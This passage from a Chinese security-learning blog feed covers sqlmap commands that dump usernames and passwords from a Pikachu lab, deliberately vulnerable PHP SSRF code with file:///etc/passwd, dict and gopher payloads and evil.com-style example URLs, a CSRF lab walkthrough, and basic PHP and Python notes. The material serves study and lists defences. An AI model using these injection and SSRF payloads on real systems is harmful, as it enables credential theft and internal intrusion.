class="hljs-string">&quot;http://192.168.59.143/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span> -D pikachu -T users --columns --<span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure><p>获取指定 表 指定字段内容</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://192.168.59.143/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span> -D pikachu -T users -C <span class="hljs-string">&quot;id,username,password&quot;</span> --<span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure><h4 id="获取指定条数"><a href="#获取指定条数" class="headerlink" title="获取指定条数"></a>获取指定条数</h4><p>获取总条数</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span> -D pikachu -T users --count<br></code></pre></td></tr></table></figure><p>获取指定id条数</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span> -D pikachu -T users --<span class="hljs-keyword">dump</span> --start <span class="hljs-number">1</span> --stop <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>删除缓存文件<br>参数：–flush-session<br>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。</p><h3 id="SQLMAP实战技巧二"><a href="#SQLMAP实战技巧二" class="headerlink" title="SQLMAP实战技巧二"></a>SQLMAP实战技巧二</h3>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQLMAP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编码之间的转换</title>
    <link href="/2023/06/02/%E7%BC%96%E7%A0%81%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2/"/>
    <url>/2023/06/02/%E7%BC%96%E7%A0%81%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="编码之间的转换"><a href="#编码之间的转换" class="headerlink" title="编码之间的转换"></a>编码之间的转换</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">base64_payload = <span class="hljs-built_in">str</span>(base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=&quot;</span>+base64_payload<br></code></pre></td></tr></table></figure><p>今天在做题的时候看到了这么一个payload，我最开始的理解是，该payload进行一个utf-8编码，然后进行base64编码，最后再进行一次utf-8编码。但是这么理解会出现问题，上面的描述是base64的payload，那我为什么要进行utf-8的编码呢</p><h4 id="str-函数"><a href="#str-函数" class="headerlink" title="str()函数"></a>str()函数</h4><p>在 Python 中，<strong>str() 函数用于将其他数据类型转换为字符串类型</strong>。它可以将数字、布尔值、列表、元组、字典等 Python 对象转换为字符串。当我们调用 str() 函数时，它会将输入的对象转换为字符串类型，并返回一个新的字符串对象。</p><p>例如，如果我们有一个数字变量x，我们可以使用str()函数将其转换为字符串类型，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">x=<span class="hljs-number">42</span><br>s=<span class="hljs-built_in">str</span>(x)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>这将输出字符串’42’，因为str()函数将数字42转换为字符串类型</p><p>另外，str()函数还可以接受一个可选的参数encoding，用于指定字符串的编码方式。默认情况下，str()函数使用系统默认的编码方式，通常是UTF-8编码。如果需要使用其他编码方式，可以将其作为参数传递给str编码</p><h4 id="base64"><a href="#base64" class="headerlink" title="base64()"></a>base64()</h4><p>base64 是一种编码方式，<strong>可以将二进制数据转换成可打印的 ASCII 字符串</strong>。在 Python 中，可以使用 base64 模块中的 b64encode() 函数将二进制数据编码成 base64 字符串。例如，将字符串 “hello” 编码成 base64 字符串的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>s = <span class="hljs-string">&quot;hello&quot;</span><br>b = s.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>b64 = base64.b64encode(b)<br><span class="hljs-built_in">print</span>(b64)<br></code></pre></td></tr></table></figure><p>输出结果为：b’aGVsbG8&#x3D;’。这就是将字符串 “hello” 编码成 base64 字符串后的结果。可以看到，原来的字符串被编码成了一串由大小写字母、数字和特殊字符组成的字符串。</p><h4 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h4><p>在 Python 中，字符串是以 Unicode 编码的。而在网络传输或者存储数据时，通常需要将数据编码成字节序列。其中，UTF-8 编码是一种常用的可变长度编码方式，它可以将 Unicode 字符编码成一个或多个字节</p><p>在 Python 中，可以使用 <code>encode()</code> 方法将字符串编码成字节序列。其中，参数指定了编码方式，常用的编码方式包括 UTF-8、GBK、GB2312 等等。例如，将字符串 <code>&quot;hello&quot;</code> 编码成 UTF-8 字节序列的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;hello&quot;</span><br>b = s.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure><p>输出结果为：**<code>b&#39;hello&#39;</code>**。可以看到，字符串 <code>&quot;hello&quot;</code> 被编码成了一个字节序列。在 UTF-8 编码中，每个英文字母都被编码成一个字节。</p><h5 id="字节和字符串"><a href="#字节和字符串" class="headerlink" title="字节和字符串"></a>字节和字符串</h5><p>看到这里我们又坐不住了，’hello’怎么看都像个字符串，为什么说是字节呢<strong>在 UTF-8 编码中，一个英文字母通常占用 1 个字节</strong></p><p>当你将一个字符串编码为 UTF-8 字节序列时，它看起来和字符串非常相似，但它们实际上是不同的类型。字符串是 Unicode 字符的序列，而字节序列是 8 位字节的序列。可以通过查看它们的类型来了解它们之间的区别：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">string = <span class="hljs-string">&quot;Hello, world!&quot;</span><br>byte_string = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(string)) <span class="hljs-comment"># &lt;class &#x27;str&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(byte_string)) <span class="hljs-comment"># &lt;class &#x27;bytes&#x27;&gt;</span><br></code></pre></td></tr></table></figure><p>这将输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>可以看到，string 的类型是 &lt;class ‘str’&gt;，而 byte_string 的类型是 &lt;class ‘bytes’&gt;。</p><h5 id="二进制和字节"><a href="#二进制和字节" class="headerlink" title="二进制和字节"></a>二进制和字节</h5><p>二进制指的是一种数字表示方式，它只有两个数字 0 和 1，用于表示计算机中的数据。而字节则是计算机中存储数据的基本单位，它由 8 个二进制位组成，可以表示 0 到 255 之间的整数。因此，可以说字节是计算机中存储二进制数据的基本单位。在计算机中，二进制数据通常以字节的形式存储和处理。</p>]]></content>
    
    
    <categories>
      
      <category>计组</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="/2023/05/31/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/05/31/SSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h3 id="SSRF漏洞描述"><a href="#SSRF漏洞描述" class="headerlink" title="SSRF漏洞描述"></a>SSRF漏洞描述</h3><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的<br>安全漏洞。一般情况下，SSRF 攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所<br>以服务端能请求到与自身相连而与外网隔离的内部系统)。</p><h3 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h3><p>SSRF 的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF 利用存在缺陷的 Web 应用作为代理攻击远程和本地的服务器<br>主要攻击方式如下所示</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网 Web 应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的 Web 应用，主要是使用 HTTP GET 请求就可以实现的攻击(比如 struts2、SQli 等)。</li><li>利用 file 协议读取本地文件等。</li></ul><h3 id="SSRF漏洞代码分析"><a href="#SSRF漏洞代码分析" class="headerlink" title="SSRF漏洞代码分析"></a>SSRF漏洞代码分析</h3><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>] != <span class="hljs-literal">null</span>)&#123;<br><br>    <span class="hljs-comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span><br>    <span class="hljs-variable">$URL</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$CH</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$URL</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$CH</span>, CURLOPT_HEADER, <span class="hljs-literal">FALSE</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);<br>    <span class="hljs-variable">$RES</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$CH</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$CH</span>) ;<br><span class="hljs-comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span><br><span class="hljs-comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span><br><span class="hljs-comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$RES</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123; <br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <br><span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;./images/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;;img1.jpg&#x27;</span>; <br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br><span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$img</span>; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h4 id="sockopen"><a href="#sockopen" class="headerlink" title="sockopen()"></a>sockopen()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br><span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br><span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br><span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>&#125; <br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>&#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="SSRF漏洞攻击"><a href="#SSRF漏洞攻击" class="headerlink" title="SSRF漏洞攻击"></a>SSRF漏洞攻击</h3><p>SSRF 支持很多协议所以漏洞利用的方法有挺多的<br>1.http 协议<br>能进行内网端口探测-可以通过返回的时间和长度判断端口的开放。</p><p>2.file 协议读取文件<br><a href="http://192.168.0.103/06/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd">http://192.168.0.103/06/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd</a></p><p>3.dict 协议内网扫描<br>能进行内网端口的探测-可以探测到具体的版本号等等信息。<br><a href="http://192.168.0.103/06/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306">http://192.168.0.103/06/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306</a></p><p>4.gopher 协议<br>能进行内网端口的探测-可以发送 get 或者来攻击内网的 redis 等服务。<br><a href="http://192.168.0.103/06/vul/ssrf/ssrf_curl.php?url=gopher://127.0.0.1:3306">http://192.168.0.103/06/vul/ssrf/ssrf_curl.php?url=gopher://127.0.0.1:3306</a></p><h3 id="SSRF支持的协议"><a href="#SSRF支持的协议" class="headerlink" title="SSRF支持的协议"></a>SSRF支持的协议</h3><p>ftp<br>ssrf.php?url&#x3D;<a href="ftp://evil.com:12345/TEST">ftp://evil.com:12345/TEST</a><br>file:&#x2F;&#x2F;<br>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password<br>Dict:&#x2F;&#x2F;<br>dict:&#x2F;&#x2F;<user-auth>@<host>:<port>&#x2F;d:<word><br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;<br>SFTP:&#x2F;&#x2F;<br>ssrf.php?url&#x3D;s<a href="ftp://example.com:11111/">ftp://example.com:11111/</a><br>TFTP:&#x2F;&#x2F;<br>ssrf.php?url&#x3D;t<a href="ftp://example.com:12346/TESTUDPPACKET">ftp://example.com:12346/TESTUDPPACKET</a><br>LDAP:&#x2F;&#x2F;<br>ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit<br>Gopher:&#x2F;&#x2F;<br>ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:3306</p><h3 id="SSRF-漏洞防御方案"><a href="#SSRF-漏洞防御方案" class="headerlink" title="SSRF 漏洞防御方案"></a><strong>SSRF 漏洞防御方案</strong></h3><p>1.禁止跳转<br>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的<br>文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。<br>3.禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引<br>起的问题<br>4.设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP）<br>5.限制请求的端口为 http 常用的端口，比如 80、443、8080、8090<br>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>常见web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="/2023/05/31/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/05/31/CSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="跨站请求伪造CSRF"><a href="#跨站请求伪造CSRF" class="headerlink" title="跨站请求伪造CSRF"></a>跨站请求伪造CSRF</h2><h3 id="csrf漏洞描述"><a href="#csrf漏洞描述" class="headerlink" title="csrf漏洞描述"></a>csrf漏洞描述</h3><p>CSRF 定义： 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者<br>session riding，通常缩写为 CSRF ， 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作<br>的攻击方法。<br>简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操<br>作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站<br>会认为是真正的用户操作而去执行。这利用了 web 中用户身份验证的一个漏洞：简单的身份验证只能保证<br>请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><h3 id="csrf漏洞攻击原理"><a href="#csrf漏洞攻击原理" class="headerlink" title="csrf漏洞攻击原理"></a>csrf漏洞攻击原理</h3><p>1、用户打开浏览器，访问登陆受信任的 A 网站<br>2、在用户信息通过验证后，服务器会返回一个 cookie 给浏览器，用户登陆网站 A 成功，可以正常发送请求到网站 A<br>3、用户未退出网站 A，在同一浏览器中，打开一个危险网站 B<br>4、网站 B 收到用户请求后，返回一些恶意代码，并发出请求要求访问网站 A<br>5、浏览器收到这些恶意代码以后，在用户不知情的情况下，利用 cookie 信息，向网站 A 发送恶意请求，网站<br>6、A 会根据 cookie 信息以用户的权限去处理该请求，导致来自网站 B 的恶意代码被执行</p><h3 id="CSRF漏洞攻击"><a href="#CSRF漏洞攻击" class="headerlink" title="CSRF漏洞攻击"></a>CSRF漏洞攻击</h3><p>打开 pichachu 靶场来到 csrf（get）漏洞，输入用户登录后发现修改密码处没有任何验证，存在 csrf 攻<br>击，通过 csrf 漏洞攻击修改资料。<br>我们使用burpsuite进行抓包，然后点击 generate csrf-poc即可构造exp<br><img src="/img/csrf1.png" srcset="/img/loading.gif" lazyload><br><img src="/img/scrf2.png" srcset="/img/loading.gif" lazyload><br>新建.html复制到其中，点击即可触发攻击</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>常见web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>当前目录和父级目录</title>
    <link href="/2023/05/30/%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E5%92%8C%E7%88%B6%E7%BA%A7%E7%9B%AE%E5%BD%95/"/>
    <url>/2023/05/30/%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E5%92%8C%E7%88%B6%E7%BA%A7%E7%9B%AE%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="x2F-和-x2F-的区别"><a href="#x2F-和-x2F-的区别" class="headerlink" title="..&#x2F;和.&#x2F;的区别"></a>..&#x2F;和.&#x2F;的区别</h2><p>.&#x2F;是当前目录（其中.&#x2F;等价于不写，即href”.&#x2F;layui&#x2F;css&#x2F;layui.css”和href&#x3D;”layui&#x2F;css&#x2F;layui.css”是一样的效果）</p><p>..&#x2F;是父级目录（表示当前文件下的删一个文件夹）</p><p>&#x2F;是根目录（表示一下子回到最顶端的那个文件夹下）</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花括号</title>
    <link href="/2023/05/30/%E8%8A%B1%E6%8B%AC%E5%8F%B7/"/>
    <url>/2023/05/30/%E8%8A%B1%E6%8B%AC%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP花括号语法总结"><a href="#PHP花括号语法总结" class="headerlink" title="PHP花括号语法总结"></a>PHP花括号语法总结</h2><h2 id="一、函数内容"><a href="#一、函数内容" class="headerlink" title="一、函数内容"></a>一、函数内容</h2><p><code>function name()&#123;&#125;， for()&#123;&#125;</code>等等这种情况就不多说了，不说也知道是做什么用的了</p><h2 id="二、-当数组"><a href="#二、-当数组" class="headerlink" title="二、{}当数组"></a>二、{}当数组</h2><p><code>$str&#123;4&#125;</code>在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是吧字符串变量当成数组处理。举个例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;phpernote.com&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>&#123;<span class="hljs-number">0</span>&#125;; <span class="hljs-comment">// 输出 p</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>[<span class="hljs-number">1</span>]; <span class="hljs-comment">// 输出 h</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;000&#x27;</span>;<br><span class="hljs-variable">$str</span>&#123;<span class="hljs-number">0</span>&#125;=<span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>; <span class="hljs-comment">// 输出 100</span><br></code></pre></td></tr></table></figure><p>注意：利用这一特性可用来检查某个字符串是否满足多少长度，使用 isset 的方式替代 strlen 函数，因为 isset 是语言结构，strlen 是函数，所以使用 isset 比使用 strlen 效率更高。比如判断一个字符串的长度是否小于 5，<strong>如下<code>if(!isset($str&#123;5&#125;)) 比 if(strlen($str)&lt;5)</code> 更好。</strong></p><h2 id="三、花括号里面当变量"><a href="#三、花括号里面当变量" class="headerlink" title="三、花括号里面当变量"></a>三、花括号里面当变量</h2><p>对于可变变量使用大括号，比如：<code>&#123;$val&#125;</code>，这时候大括号就是告诉PHP，括起来的部分要当成变量处理。如下例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;www&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-string">&#x27;phpernote&#x27;</span>,<span class="hljs-string">&#x27;com&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$array</span>[&#x27;name&#x27;]&quot;</span>;<span class="hljs-comment">//用此句会报语法错误</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$array[&#x27;name&#x27;]&#125;</span>&quot;</span>;<span class="hljs-comment">//此句正常，大括号内的字符将作为变量来处理</span><br></code></pre></td></tr></table></figure><p>注意：${$a[1]} 与${$a}[1] 是完全不同的：<br>${$a[1]} 这里$a[1]是一个变量；<br>${$a}[1] 这里$a是一个变量；<br>这种写法的好处就是在字符串中引用变量的时候，这样就可以不使用.运算符，从而减少代码的输入量。</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2023/05/29/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2023/05/29/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a><strong>正则表达式</strong></h2><p>在PHP中，正则表达式是由分隔符、模式和可选修饰符组成的字符串</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$<span class="hljs-built_in">exp</span> = <span class="hljs-string">&quot;/w3schools/i&quot;</span>;<br></code></pre></td></tr></table></figure><p>在上面的例子中，&#x2F; 是分隔符，w3schools 是模式，而i是一个修饰符，它使搜索不区分大小写。</p><p>分隔符可以是任何非字母、数字、反斜杠或者空格的字符。最常见的分隔符是正斜杠（&#x2F;），但是当您的模式包含正斜杠时，选择其他分割符（例如#或~）会很方便。</p><h2 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a><strong>正则表达式函数</strong></h2><p>PHP提供了多种允许您使用正则表达式的函数。preg_match()、preg_match_all() 和 preg_replace()  函数是一些最常用的函数：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>preg_match()</td><td>如果在字符串中找到该模式，则返回 1，否则返回 0</td></tr><tr><td>preg_match_all()</td><td>返回模式在字符串中被找到的次数，也可以是0</td></tr><tr><td>preg_replace()</td><td>返回一个新字符串，其中匹配的模式已被另一个字符串替换</td></tr></tbody></table><h4 id="使用-preg-match"><a href="#使用-preg-match" 